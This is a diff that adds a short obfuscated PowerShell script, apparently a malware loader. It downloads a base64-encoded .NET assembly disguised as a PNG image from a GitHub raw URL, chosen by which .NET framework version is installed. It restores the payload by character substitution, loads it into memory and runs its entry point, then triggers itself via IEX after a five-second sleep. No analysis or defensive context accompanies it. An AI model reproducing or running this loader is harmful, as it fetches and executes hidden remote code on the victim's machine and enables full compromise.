@@ -1,0 +1,11 @@
+Function FFFFFFFFFFFFFFFFFFFFFFFFFFFFFGFG
+{
+
+if([System.IO.File]::Exists("C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe")){
+$Cli555=((New-Object Net.WebClient).DOWNLOADSTRING.Invoke('https://raw.githubusercontent.com/sattarwahid602/ddd/master/net4.png').replace('@','A').replace('#','B').replace('~','E'));[Reflection.Assembly]::Load([Convert]::FromBase64String($Cli555)).EntryPoint.invoke($2000 - $2000,$null)
+}else{
+$Cli555=((New-Object Net.WebClient).DOWNLOADSTRING.Invoke('https://raw.githubusercontent.com/sattarwahid602/ddd/master/net2.png').replace('@','A').replace('#','B').replace('~','E'));[Reflection.Assembly]::Load([Convert]::FromBase64String($Cli555)).EntryPoint.invoke($2000 - $2000,$null)
+}
+}
+Start-Sleep -S 5 
+IEX FFFFFFFFFFFFFFFFFFFFFFFFFFFFFGFG
